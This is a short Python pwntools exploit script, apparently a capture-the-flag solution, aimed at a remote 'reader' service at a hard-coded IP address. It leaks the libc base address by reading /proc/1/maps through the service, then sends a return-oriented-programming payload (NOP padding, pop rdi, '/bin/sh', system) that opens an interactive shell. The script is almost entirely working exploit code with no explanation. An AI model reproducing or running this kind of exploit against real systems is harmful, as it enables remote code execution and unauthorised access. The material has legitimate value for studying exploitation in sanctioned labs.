from pwn import *


#r = process("./reader")
r = remote("34.252.33.37",30864)


def get_info():
    r.recv()
    r.sendline(b"/proc/loadavg")

    z = r.recv().decode()

    print(f"received = {z}")

def get_base_add():
    r.recv()
    r.sendline(b"/proc/1/maps")

    z = r.recvuntil(b"/usr/lib/x86_64-linux-gnu/libc.so.6").decode()
    l = z.split("\n")

    r.recv()
    
    print(f"received = {l}")
    base_add = l[-1][:l[-1].index("-")]
    return int(base_add,16)
#get_info()

libc_base_add  = get_base_add()
# remote libc

print(f"base address = {hex(libc_base_add)}")



pop_rdi = p64(libc_base_add + 0x10f75b)
bin_sh = p64(libc_base_add + 0x1cb42f)

ret = p64(libc_base_add + 0x2882f)

system = p64(libc_base_add + 0x58740)

# local libc
'''
libc_base_add = 0x7ffff7da8000

pop_rdi = p64(libc_base_add + 0x2a205)

puts = p64(libc_base_add + 0x1f5a3)

bin_sh = p64(libc_base_add + 0x1a7e43)
ret = p64(libc_base_add + 0x28635)
system = p64(libc_base_add + 0x528f0)
'''


payload = flat(
    [
        asm("nop")*120,
        pop_rdi,
        bin_sh,
        ret,
        system
    ]
)

with open("pay","wb") as f:
    f.write(payload)

r.recv()

r.sendline(payload)

r.interactive()
